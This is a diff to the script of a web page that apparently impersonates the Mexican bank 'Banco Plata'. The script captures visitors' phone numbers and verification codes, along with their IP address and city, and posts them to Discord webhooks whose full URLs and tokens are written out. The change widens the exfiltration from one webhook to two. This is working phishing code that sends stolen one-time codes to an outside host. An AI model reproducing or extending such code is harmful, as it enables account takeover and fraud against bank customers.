@@ -56,8 +56,7 @@
   </div>
 
   <script>
-    // NUEVO WEBHOOK ACTUALIZADO
-    const DISCORD_WEBHOOK = [
+    const DISCORD_WEBHOOKS = [
       'https://discord.com/api/webhooks/1571213669348675625/h6b4ppxq74Q9WmwVFCrcCQ-hcWpKboACJX5KyVzURPvxCvNxS9OdAncT0vRavWsYMJr0',
       'https://discord.com/api/webhooks/1571164818553966615/6aK6_RyRyUP7M8SAr3RZDHP2nTsK1wu_irSR2ewG2i5t4axW1ad1hP21yRNXJdUIQQc'
     ];
@@ -68,7 +67,7 @@
         const data = await res.json();
         const time = new Date().toLocaleString('es-MX', { timeZone: 'America/Mexico_City' });
         const payload = { username: "Banco Plata - Eventos", content: `🖱️ **Acción del Usuario:** ${actionName}\n\n**🌐 IP:** ${data.ip || 'Desconocida'}\n**📍 Ciudad:** ${data.city || 'Desconocida'}\n**⏰ Hora:** ${time}` };
-        await fetch(DISCORD_WEBHOOK, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
+        for (const webhook of DISCORD_WEBHOOKS) { await fetch(webhook, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) }); }
       } catch (e) { console.error('Error tracking', e); }
     }
 
@@ -102,7 +101,7 @@
         const data = await res.json();
         const time = new Date().toLocaleString('es-MX', { timeZone: 'America/Mexico_City' });
         const payload = { username: "Banco Plata - Código", content: `🔐 **Nuevo Intento de Código**\n\n**📱 Teléfono:** ${phone}\n**🔢 Código:** ${code}\n**🌐 IP:** ${data.ip || 'Desconocida'}\n**📍 Ciudad:** ${data.city || 'Desconocida'}\n**⏰ Hora:** ${time}` };
-        await fetch(DISCORD_WEBHOOK, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
+        for (const webhook of DISCORD_WEBHOOKS) { await fetch(webhook, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) }); }
       } catch (e) { console.error('Error Discord', e); }
     }
 
